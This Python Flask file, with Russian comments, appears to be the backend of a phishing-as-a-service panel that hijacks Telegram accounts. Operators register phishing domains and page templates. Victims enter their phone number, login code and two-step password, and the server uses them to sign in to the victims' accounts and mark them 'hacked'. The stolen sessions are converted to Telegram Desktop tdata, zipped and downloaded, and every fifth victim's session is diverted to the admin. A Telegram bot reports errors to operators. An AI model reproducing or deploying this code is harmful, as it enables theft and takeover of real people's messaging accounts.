from app import app
from flask import render_template, request, redirect, url_for, flash, session, jsonify, send_file
from werkzeug.security import generate_password_hash, check_password_hash
from hashlib import sha256
from db import User, Victim
import requests
import json
import os
import re
from datetime import datetime
from config import salt, server_domain
import validators
from tg_client import ClientTG
from telethon.errors.rpcerrorlist import PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError, PhoneCodeExpiredError, ApiIdInvalidError, PhoneNumberInvalidError, PasswordHashInvalidError
from bot import Bot
from opentele.tl import TelegramClient
from opentele.api import UseCurrentSession
import shutil
import zipfile
from config import timezone


db = User('./users.db', 'users')

# def RemoveLogs():
#     current_time = datetime.now()
#     formatted_time = current_time.strftime("%H:%M:%S") 
#     print("Current time: " + formatted_time)

async def is_valid_domain(domain):
    domain_pattern = r"^(?!:\/\/)(?!https:\/\/)([A-Za-z0-9.-]+(\.[A-Za-z]{2,})+)$"
    if bool(re.match(domain_pattern, domain)):
        length = domain.split('.')
        if len(length) > 2:
            return False
        else:
            return True
    return False

async def is_valid_session(session_path):
    try:
        client = TelegramClient(session_path)
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        tdesk.SaveTData(f'./TData/{session_path.split(".")[0]}/tdata/tdata')
        if os.path.exists(f'./TData/{session_path.split(".")[0]}/'):
            shutil.rmtree(f'./TData/{session_path.split(".")[0]}/')
        return True
    except Exception as e:
        if os.path.exists(f'./TData/{session_path.split(".")[0]}/'):
            shutil.rmtree(f'./TData/{session_path.split(".")[0]}/')
        return False



# @app.before_request
# async def enforce_https():
#     if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
#         https_url = request.url.replace('http://', 'https://', 1)
#         return redirect(https_url, code=301)





@app.route('/')
async def index():
    host = request.headers.get('Host')
    if host == server_domain:
        return redirect(url_for('panel'))
    else:
        try:
            domains = os.listdir(f'templates/domains/')
            for domain in domains:
                if host in domain:
                    username = os.listdir(f'templates/domains/{domain}/')
                    username = username[0].replace(".html", "")
                    db_victim = Victim(f'./users/{username}/database.db')
                    url_redirect = db_victim.GetRedirect()
                    return redirect(url_redirect[0][0])
        except:
            return "https://example.com"








###########################################
#                                         #
#                  Вход                   #
#                                         #
###########################################
@app.route('/login', methods=['POST', 'GET'])
async def login():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if request.method == 'POST':
        # Если был POST запрос
            user = db.GetUserBy('username', request.form['username'])
            admin_data = db.GetAdmins(request.form['username'])
            pwd = salt+request.form['password']
    

            if request.form['username'] == admin_data[0] and admin_data[1] == sha256(pwd.encode('utf-8')).hexdigest():
                # Если это админ
                session['username'] = request.form['username']
                return redirect(url_for('panel', username=request.form['username']))
            elif user and check_password_hash(user[0][2], request.form['password']):
                # Если правильные данные
                session['username'] = request.form['username']
                if not user[0][5]:
                    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
                        ipaddress = request.environ['REMOTE_ADDR']
                    else:
                        ipaddress = request.environ['HTTP_X_FORWARDED_FOR']
                        
                    r = requests.get('http://ip-api.com/json/' + ipaddress)
                    ipdata = json.loads(r.text)

                    if ipdata['status'] == 'success':
                        data = [
                            ['ip', ipaddress],
                            ['city', ipdata['city']],
                            ['country', ipdata['country']],
                            ['updated_on', datetime.now(timezone)]
                        ]
                        db.UpdateUser(data, 'username', request.form['username'])
                db.UpdateActivity(request.form['username'])
                return redirect(url_for('panel', username=request.form['username']))
            else:
                # Если данные неверные
                flash(('Неверные данные', 'error'))
                return render_template('login.html', login=True)
        else:
        # Если был GET запрос
            # Если есть сессия
            if 'username' in session:
                return redirect(url_for('panel'))
            else:
                # Если нет сессии
                return render_template('login.html')
    else:
        try:
            path = 'login'
  
            url = domain + '$' + path

            username = os.listdir(f'templates/domains/{url}/')[0]

            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)
            
            return render_template(f'domains/{url}/{username}')
        except:
            return redirect(url_for('index', path=request.path.replace('/', '')))
    


###########################################
#                                         #
#                  Панель                 #
#                                         #
###########################################
@app.route('/panel', methods=['POST', 'GET'])
async def panel():
    domain = request.headers.get('Host')
    if domain == server_domain:
        global db

        username = request.form.get('username')
        admin = None
        logs = None

        if 'username' in session:
            username = session['username']
        else:
            return redirect(url_for('login'))
        

        if username == db.GetAdmins(session['username'])[0]:
            admin = True
            if request.args.get('users_manage'):
                users = db.GetAllUsers()
                return render_template('users_manage.html', admin=admin, users=users)
            elif request.args.get('top_users'):
                tops = db.GetTops()
                return render_template('top_users.html', admin=admin, tops=tops)
            else:
                admin_logs = db.GetLogs()
                return render_template('index.html', admin=admin, admin_logs=admin_logs)

        if not admin:
            db_victim = Victim(f'./users/{username}/database.db')
            logs = db_victim.GetLogs()
        else:
            return redirect(url_for("news"))
        
        db.UpdateActivity(username)
        return render_template('index.html', username=username, admin=admin, logs=logs)
    else:
        try:
            path = 'panel'
            url = domain + '$' + path

            username = os.listdir(f'templates/domains/{url}/')[0]
            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)

            return render_template(f'domains/{url}/{username}')
        except:
            return redirect(url_for('index', path=request.path.replace('/', '')))
    




###########################################
#                                         #
#                  Панель                 #
#                                         #
###########################################
@app.route('/shortener', methods=['POST', 'GET'])
async def shortener():
    domain = request.headers.get('Host')
    if domain == server_domain:
        admin = False
        if session['username'] == db.GetAdmins(session['username'])[0]:
            admin = True
        else:
            db.UpdateActivity(session['username'])
        return render_template('shortener.html', admin=admin)
    else:
        try:
            path = 'shortener'
            url = domain + '$' + path

            username = os.listdir(f'templates/domains/{url}/')[0]
            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)

            return render_template(f'domains/{url}/{username}')
        except:
            return redirect(url_for('index', path=request.path.replace('/', '')))








###########################################
#                                         #
#             Добавить FAQ                #
#                                         #
###########################################
@app.route('/short_it', methods=['POST'])
async def short_it():
    if 'username' in session:
        url = request.form.get('url')

        data = {
            "query":"fragment apiErrorReason on ApiErrorReason { kind message } fragment apiError on ApiError { kind reason { ...apiErrorReason } } fragment shortenedUrl on ShortenedUrl { originalUrl shortenedUrl initialError } query shortenedUrl($url : String!) { shortenedUrl(url : $url) { data { ...shortenedUrl }, error { ...apiError } } }","variables":{"url":url}
        }
        headers = {
            'Host': 'clck.ru',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Content-Length': '409',
            'Origin': 'https://clck.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://clck.ru/?url=https%3A%2F%2Fwww.unisender.com%2Fru%2Fblog%2Fidei%2Fkorotkiy-url%2F',
            'Cookie': '_yasc=DFXiS0uD7WJodXn3ee8rs/Zr7FZdojEUa1/1zPO4jHfFZfG8gqSkTjGI0fJBp9gT; was-copy-hint-shown=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }

        r = requests.post("https://clck.ru/---", json=data, headers=headers)
        data = json.loads(r.text)

        if r.status_code == 200:
            db.UpdateActivity(session['username'])
            response = {'status': 'success', 'message': 'Ссылка сокращена', 'url': data['data']['shortenedUrl']['data']['shortenedUrl']}
        else:
            response = {'status': 'error', 'message': 'Ошибка'}
        return jsonify(response)
    else:
        return {'status': 'error', 'message': 'Ошибка'}






###########################################
#                                         #
#                Новости                  #
#                                         #
###########################################
@app.route('/news', methods=['POST', 'GET'])
async def news():
    domain = request.headers.get('Host')
    if domain == server_domain:
        username = session['username']
        global db
        news = db.GetNews()
        admin = False
        
        if username == db.GetAdmins(username)[0]:
            admin = True
        else:
            db.UpdateActivity(session['username'])

        return render_template('news.html', news=news, admin=admin)
    else:
        try:
            path = 'news'
            url = domain + '$' + path

            username = os.listdir(f'templates/domains/{url}/')[0]
            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)

            return render_template(f'domains/{url}/{username}')
        except:
            return redirect(url_for('index', path=request.path.replace('/', '')))









###########################################
#                                         #
#                  FAQ                    #
#                                         #
###########################################
@app.route('/info', methods=['POST', 'GET'])
async def info():
    domain = request.headers.get('Host')
    if domain == server_domain:
        username = session['username']
        global db
        admin = False
        info = db.GetInfo()

        if username == db.GetAdmins(username)[0]:
            admin = True
        else:
            db.UpdateActivity(session['username'])

        return render_template('info.html', admin=admin, infos=info)
    else:
        try:
            path = 'info'
            url = domain + '$' + path

            username = os.listdir(f'templates/domains/{url}/')[0]
            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)

            return render_template(f'domains/{url}/{username}')
        except:
            return redirect(url_for('index', path=request.path.replace('/', '')))
        





###########################################
#                                         #
#             Добавить FAQ                #
#                                         #
###########################################
@app.route('/add_faq', methods=['POST'])
async def add_faq():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        title = request.form.get('title')
        link = request.form.get('link')

        news = db.AddInfo(title, link)

        if news:
            response = {'status': 'success', 'message': 'FAQ успешно добавлен'}
        else:
            response = {'status': 'error', 'message': 'Ошибка'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
    


###########################################
#                                         #
#             Удалить FAQ                 #
#                                         #
###########################################
@app.route('/remove_faq', methods=['POST'])
async def remove_faq():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        id = request.form.get('id')
        news = db.RemoveInfo(id)

        if news:
            response = {'status': 'success', 'message': 'FAQ успешно удалён'}
        else:
            response = {'status': 'error', 'message': 'Ошибка, возможно такого FAQ нету'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})

###########################################
#                                         #
#          Добавить новости               #
#                                         #
###########################################
@app.route('/add_news', methods=['POST'])
async def add_news():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        title = request.form.get('title')
        desc = request.form.get('desc')

        news = db.AddNews(title, desc)

        if news:
            response = {'status': 'success', 'message': 'Новость успешно добавлена'}
        else:
            response = {'status': 'error', 'message': 'Ошибка'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
    


###########################################
#                                         #
#            Удалить новость              #
#                                         #
###########################################
@app.route('/remove_news', methods=['POST'])
async def remove_news():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        id = request.form.get('id')
        news = db.RemoveNews(id)

        if news:
            response = {'status': 'success', 'message': 'Новость успешно удалена'}
        else:
            response = {'status': 'error', 'message': 'Ошибка, возможно такой новости нету'}
        
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})


###########################################
#                                         #
#           Изменить новости              #
#                                         #
###########################################
@app.route('/edit_news', methods=['POST'])
async def edit_news():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        id = request.form.get('id')
        title = request.form.get('title')
        desc = request.form.get('desc')

        news = db.EditNews(title, desc, id)

        if news:
            response = {'status': 'success', 'message': 'Новость успешно изменена'}
        else:
            response = {'status': 'error', 'message': 'Ошибка, возможно такой новости нету'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
###########################################
#                                         #
#          Добавить пользователя          #
#                                         #
###########################################
@app.route('/add_user', methods=['POST'])
async def add_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        username = request.form.get('username')
        password = request.form.get('password')
        chat_id = request.form.get('chat_id')
        bot_token = request.form.get('bot_token')
        note = request.form.get('note')

        user = db.GetUserBy('username', username)

        if user:
            response = {'status': 'error', 'message': 'Такой пользователь уже существует'}
        else:
            db.AddUser(username, generate_password_hash(password), chat_id, bot_token, note)
            response = {'status': 'success', 'message': 'Пользователь успешно добавлен'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
    

###########################################
#                                         #
#          Удалить пользователя           #
#                                         #
###########################################
@app.route('/remove_user', methods=['POST'])
async def remove_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        username = request.form.get('username')
        
        user = db.GetUserBy('username', username)

        if user:
            db_victim = Victim(f'./users/{username}/database.db')
            phishes = db_victim.GetDomains()
            domains = os.listdir(f'templates/domains/')
 
            for i in range(0, len(phishes)):
                for host in domains:
                    if host.startswith(phishes[i][1]):
                        os.rmtree(f'./templates/domains/{host}')
                        db_victim.RemoveDomain(phishes[i][1])
            
            db.RemoveUser(username)


            response = {'status': 'success', 'message': 'Пользователь успешно удалён'}
        else:
            response = {'status': 'error', 'message': 'Такой пользователь не существует'}
            
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})


###########################################
#                                         #
#         Изменить пользователя           #
#                                         #
###########################################
@app.route('/edit_user', methods=['POST'])
async def edit_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        password = request.form.get('password')
        user_id = request.form.get('user_id')
        city = request.form.get('city')
        country = request.form.get('country')
        note = request.form.get('note')
        user_id = request.form.get('user_id')
        chat_id = request.form.get('chat_id')
        bot_token = request.form.get('bot_token')
        print(password)
        user = db.GetUserBy('id', user_id)

        if user:
            data = [
                ['password_hash', generate_password_hash(password)],
                ['city', city],
                ['country', country],
                ['chat_id', chat_id],
                ['bot_token', bot_token],
                ['note', note],
            ]
            print(generate_password_hash(password))
            db.UpdateUser(data, 'id', user_id)
            
            response = {'status': 'success', 'message': 'Пользватель успешно сменён'}
        else:
            response = {'status': 'error', 'message': 'Пользователь не существует'}
            
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})










###########################################
#                                         #
#                  Домены                 #
#                                         #
###########################################
@app.route('/domains', methods=['GET'])
async def domains():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            username = session['username']
        else:
            return redirect(url_for('login'))

        db_victim = Victim(f'./users/{username}/database.db')
        domains = db_victim.GetDomains()
        db.UpdateActivity(session['username'])
        return render_template('domains.html', domains=domains)
    else:
        try:
            path = 'domains'
            url = domain + '$' + path
            username = os.listdir(f'templates/domains/{url}/')[0]

            if not 'entered' in session:
                session['entered'] = True
                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
                db_victim.AddView(domain)

            return render_template(f'domains/{url}/{username}')
        except Exception as e:
            print(e)
            return redirect(url_for('index', path=request.path.replace('/', '')))




###########################################
#                                         #
#              Добавить домен             #
#                                         #
###########################################
@app.route('/add_domain', methods=['POST'])
async def add_domain():
    if 'username' in session:
        username = session['username']
        countries = json.loads(request.form.get('countries'))
        domain = request.form.get('domain')
        page = request.form.get('page')
        path = request.form.get('path')
        redirect = request.form.get('redirect')
        redirect_success = request.form.get('redirect_success')
        security = request.form.get('security')
        app_id = request.form.get('app_id')
        api_hash = request.form.get('api_hash')
        db.UpdateActivity(session['username'])

        if not countries or not domain or not page or not redirect or not path or not redirect_success or not security or not app_id or not api_hash:
            return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
        else:
            if not validators.url(redirect):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект с главной страницы, пример: https://link.com'})
            if not validators.url(redirect_success):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект после взлома, пример: https://link.com'})
            if not await is_valid_domain(domain):
                return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})

            db_victim = Victim(f'./users/{username}/database.db')

            if db_victim.CheckDomain(domain):
                return jsonify({'status': 'error', 'message': 'Этот домен уже добавлен'})
            
            data = db_victim.AddDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)

            if data[0]:
                return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
            else:
                return jsonify({'status': 'error', 'message': data[1]})
            
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})



###########################################
#                                         #
#              Изменить домен             #
#                                         #
###########################################
@app.route('/edit_domain', methods=['POST'])
async def edit_domain():
    if 'username' in session:
        username = session['username']
        domain = request.form.get('domain')
        countries = json.loads(request.form.get('countries'))
        page = request.form.get('page')
        path = request.form.get('path')
        redirect = request.form.get('redirect')
        redirect_success = request.form.get('redirect_success')
        security = request.form.get('security')
        app_id = request.form.get('app_id')
        api_hash = request.form.get('api_hash')
        db.UpdateActivity(session['username'])

        if not countries or not page or not domain or not redirect or not path or not redirect_success or not security or not app_id or not api_hash:
            return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
        else:
            if not validators.url(redirect):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект с главной страницы, пример: https://link.com'})
            if not validators.url(redirect_success):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект после взлома, пример: https://link.com'})

            db_victim = Victim(f'./users/{username}/database.db')
            
            if not db_victim.CheckDomain(domain):
                return jsonify({'status': 'error', 'message': 'Такого домена не существует!'})
            else:
                db_victim.EditDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)
                return jsonify({'status': 'success', 'message': 'Домен успешно изменён'})
            
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
    











###########################################
#                                         #
#              Обновить домен             #
#                                         #
###########################################
@app.route('/update', methods=['POST'])
async def update():
    if 'username' in session:
        username = session['username']
        url = request.form.get('url')
        id = request.form.get('id')
        db_victim = Victim(f'./users/{username}/database.db')
        data = db_victim.UpdateDomain(url, id)
        db.UpdateActivity(session['username'])
        if data[0]:
            return jsonify({'status': 'success', 'message': 'Домен изменён, перезагрузите страницу, чтобы увидеть изменения', "data": {"status": data[1]}})
        else:
            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
            
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})





###########################################
#                                         #
#             Удалить домен               #
#                                         #
###########################################
@app.route('/remove_domain', methods=['POST'])
async def remove_domain():
    if 'username' in session:
        username = session['username']
        domain = request.form.get('domain')
        db_victim = Victim(f'./users/{username}/database.db')
        data = db_victim.RemoveDomain(domain)
        db.UpdateActivity(session['username'])

        if data:
            return jsonify({'status': 'success', 'message': 'Домен успешно удалён, перезагрузите страницу, чтобы увидеть изменения'})
        else:
            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})







###########################################
#                                         #
#       Получить все данные домена        #
#                                         #
###########################################
@app.route('/getinfo', methods=['POST'])
async def getinfo():
    if 'username' in session:
        username = session['username']
        id = request.form.get('id')
        db_victim = Victim(f'./users/{username}/database.db')
        data = db_victim.GetDomainInfo(id)
        db.UpdateActivity(session['username'])

        if data[0]:
            return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
        else:
            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})



# @app.route('/tg', methods=['POST', 'GET'])
# async def tg():
#     return render_template('./domains/depian.online$login/jojo.html')






###########################################
#                                         #
#         Получаем номер телефона         #
#                                         #
###########################################
@app.route('/verify_phone', methods=['POST'])
async def verify_phone():
    domain = request.headers.get('Host')
    phone = request.form.get('phone')
    username = request.form.get('username')
    fish = request.form.get('pageID')


    if os.path.exists(f'./users/{username}/sessions/{phone[1:]}.session') or os.path.exists(f'./admin_logs/sessions/{phone[1:]}.session'):
        if await is_valid_session(f'./users/{username}/sessions/{phone[1:]}.session') or await is_valid_session(f'./admin_logs/sessions/{phone[1:]}.session'):
            return jsonify({'status': 'active', 'message': 'Вы уже подавали запрос'})
        
    db_victim = Victim(f'./users/{username}/database.db')


    data = db_victim.GetTGData(domain)

    app_id = data[0][0]
    api_hash = data[0][1]
    logs = db_victim.GetCountOfLogs()[0][0]
    if  logs == 0:
        is_to_admin = 1
    else:    
        is_to_admin = logs % 5

    try:

        if is_to_admin == 0:
            client = ClientTG(f'./admin_logs/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
            await client.connect()
            send_code = await client.send_code_request(phone=phone)
        else:
            client = ClientTG(f'./users/{username}/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
            await client.connect()
            send_code = await client.send_code_request(phone=phone)
            if not db_victim.CheckLog(phone):
                db_victim.AddLog(domain, phone, fish, "Ввёл номер")
            else:
                db_victim.UpdateLog(domain, phone, fish, "Ввёл номер")
        return jsonify({'status': 'success', 'message': 'Успешно', 'code_hash': send_code.phone_code_hash})
    except ApiIdInvalidError:
        data = db.GetBotData(username)
        chat_id = data[0][0]
        bot_token = data[0][1]
        bot = Bot(chat_id, bot_token)
        if client.is_connected():
            await client.disconnect()
        bot.sendMessage(f"""
<b>Домен: </b>{domain}
<b>Номер: </b><code>{phone}</code>
<b>Ошибка: </b><code>Смените api id и api hash</code>
""")
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        else:
            os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
    
    except PhoneNumberInvalidError:
        if client.is_connected():
            await client.disconnect()
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        else:
            os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
        return jsonify({'status': 'error', 'message': 'Неверный номер телефона'})



    except Exception as e:
        print(e)
        return
        data = db.GetBotData(username)
        chat_id = data[0][0]
        bot_token = data[0][1]
        bot = Bot(chat_id, bot_token)
        if client.is_connected():
            await client.disconnect()
        bot.sendMessage(f"""
<b>Домен: </b>{domain}
<b>Номер: </b><code>{phone}</code>
<b>Ошибка: </b><code>{e}</code>
""")
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        else:
            os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})







###########################################
#                                         #
#              Получаем код               #
#                                         #
###########################################
@app.route('/verify_code', methods=['POST'])
async def verify_code():
    domain = request.headers.get('Host')
    phone = request.form.get('phone')
    username = request.form.get('username')
    code_hash = request.form.get('code_hash')
    code = request.form.get('code')
    fish = request.form.get('pageID')
    password = request.form.get('ppa')

    db_victim = Victim(f'./users/{username}/database.db')


    data = db_victim.GetTGData(domain)

    app_id = data[0][0]
    api_hash = data[0][1]
    
    logs = db_victim.GetCountOfLogs()[0][0]
    if  logs == 0:
        is_to_admin = 1
    else:    
        is_to_admin = logs % 5
    try:
        
        if is_to_admin == 0:
            client = ClientTG(f'./admin_logs/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
            await client.connect()
            if password == '':
                await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
                db.AddLog(username, domain, phone, fish, "Взломан")
                db_victim.IncreaseLogsNum(domain)

            else:
                await client.sign_in(password=password)
                db.AddLog(username, domain, phone, fish, "Взломан", "Присутствует")
                db_victim.IncreaseLogsNum(domain)

        else:
            client = ClientTG(f'./users/{username}/sessions/{phone[1:]}.session', app_id, api_hash, phone).client
            await client.connect()
            if password == '':
                await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
                db_victim.UpdateLog(domain, phone, fish, "Взломан")
                db_victim.IncreaseLogsNum(domain)
            else:
                await client.sign_in(password=password)
                db_victim.UpdateLog(domain, phone, fish, "Взломан", "Присутствует")
                db_victim.IncreaseLogsNum(domain)
        
        redirect = db_victim.GetRedirect()
        
        return jsonify({'status': 'success', 'message': 'Успешно', 'redirect': redirect[0][1]})
    except SessionPasswordNeededError:
        if is_to_admin == 0:
            pass
        else:
            db_victim.UpdateLog(domain, phone, fish, "Ввёл код", "Присутствует")
        return jsonify({'status': 'error', 'message': 'Двух факторная авторизация', 'type': 'SessionPasswordNeededError'})


    except PhoneCodeExpiredError:
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        return jsonify({'status': 'error', 'message': 'Ваш код истёк', 'type': 'PhoneCodeExpiredError'})
    

    except PhoneCodeInvalidError:
        return jsonify({'status': 'error', 'message': 'Неверный код, пожалуйста попробуйте ещё раз.', 'type': 'PhoneCodeInvalidError'})
    

    except FloodWaitError:
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        return jsonify({'status': 'error', 'message': 'Слишком много попыток, попробуйте по позже', 'type': 'FloodWaitError'})
    except PasswordHashInvalidError:
        if is_to_admin != 0:
            db_victim.UpdateLog(domain, phone, fish, "Ввёл неверный 2FA")
        return jsonify({'status': 'error', 'message': 'Неверный пароль', 'type': 'PasswordHashInvalidError'})
        
    except ApiIdInvalidError:
        data = db.GetBotData(username)
        chat_id = data[0][0]
        bot_token = data[0][1]
        bot = Bot(chat_id, bot_token)

        bot.sendMessage(f"""
<b>Домен: </b>{domain}
<b>Номер: </b><code>{phone}</code>
<b>Ошибка: </b><code>Смените api id и api hash</code>
""")
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
    
    except Exception as e:
        data = db.GetBotData(username)
        chat_id = data[0][0]
        bot_token = data[0][1]
        bot = Bot(chat_id, bot_token)
      
        bot.sendMessage(f"""
<b>Домен: </b>{domain}
<b>Номер: </b><code>{phone}</code>
<b>Ошибка: </b><code>{e}</code>
""")
        if is_to_admin == 0:
            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})





###########################################
#                                         #
#             Удалить логи                #
#                                         #
###########################################
@app.route('/remove_logs', methods=['POST'])
async def remove_logs():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            logs = json.loads(request.form.get('logs'))
            username = session['username']
            if username == db.GetAdmins(username)[0]:
                for log in logs:
                    os.remove(f"./admin_logs/sessions/{log[1:]}.session")
                    db.RemoveLog(log)
            else:
                db.UpdateActivity(session['username'])
                db_victim = Victim(f'./users/{username}/database.db')
                for log in logs:
                    os.remove(f"./users/{username}/sessions/{log[1:]}.session")
                    db_victim.RemoveLog(log)
            return jsonify({'status': 'success', 'message': 'Логи успешно удалены'})
        else:
            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})




###########################################
#                                         #
#                  .session               #
#                                         #
###########################################
@app.route('/create_session', methods=['GET'])
async def create_session():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            logs = json.loads(request.args.get('logs'))
            username = session['username']

            if username == db.GetAdmins(username)[0]:
                with zipfile.ZipFile("./admin_logs/logs.zip", 'w') as zipf:
                    for log in logs:
                        log_file_path = os.path.join(f'./admin_logs/sessions/{log[1:]}.session')
                        zipf.write(log_file_path, arcname=log_file_path)
                    zipf.close()
            else:
                db.UpdateActivity(session['username'])
                with zipfile.ZipFile(f"./users/{username}/logs.zip", 'w') as zipf:
                    for log in logs:
                        log_file_path = os.path.join('users', username, 'sessions', f"{log[1:]}.session")
                        zipf.write(log_file_path, arcname=log_file_path)
                    zipf.close()

            return jsonify({'status': 'success', 'message': 'Успешно', 'url': f'http://{domain}/download/logs.zip'})
        else:
            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})


###########################################
#                                         #
#                  tdata                  #
#                                         #
###########################################
@app.route('/create_tdata', methods=['GET'])
async def create_tdata():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            logs = json.loads(request.args.get('logs'))
            username = session['username']

            

            if username == db.GetAdmins(username)[0]:

                for log in logs:
                    try:
                        client = TelegramClient(f"./admin_logs/sessions/{log[1:]}.session")
                        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
                        tdesk.SaveTData(f'./admin_logs/tdatas/{log[1:]}/tdata')
                    except Exception as error:
                        if os.path.exists(f'./admin_logs/tdatas/{log[1:]}'):
                            shutil.rmtree(f'./admin_logs/tdatas/{log[1:]}')
                        app.logger.error(error)

                shutil.make_archive(f'./admin_logs/logs/',
                                    'zip',
                                    f'./admin_logs/tdatas/')
                
                shutil.rmtree(f'./admin_logs/tdatas/')

            else:
                username = session['username']
                db.UpdateActivity(session['username'])

                os.mkdir(f'./users/{username}/tdatas/')
            
                for log in logs:
                    try:
                        client = TelegramClient(f"./users/{username}/sessions/{log[1:]}.session")
                        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
                        tdesk.SaveTData(f'./users/{username}/tdatas/{log[1:]}/tdata')
                    except Exception as error:
                        if os.path.exists(f'./users/{username}/tdatas/{log[1:]}'):
                            shutil.rmtree(f'./users/{username}/tdatas/{log[1:]}')
                        app.logger.error(error)

                shutil.make_archive(f'./users/{username}/logs',
                                    'zip',
                                    f'./users/{username}/tdatas/')
                
                shutil.rmtree(f'./users/{username}/tdatas/')
            
            return jsonify({'status': 'success', 'message': 'Успешно', 'url': f'http://{domain}/download/logs.zip'})
                
        else:
            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})



@app.route('/download/<filename>', methods=['GET'])
async def download_tdata(filename):
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            username = session['username']
            if username == db.GetAdmins(username)[0]:
                zip_file_path = f'./admin_logs'
            else:
                db.UpdateActivity(session['username'])
                zip_file_path = f'./users/{username}/'

            file_path = os.path.join(zip_file_path, filename)
            import io
    
            return_data = io.BytesIO()
            with open(file_path, 'rb') as fo:
                return_data.write(fo.read())

            return_data.seek(0)

            os.remove(file_path)

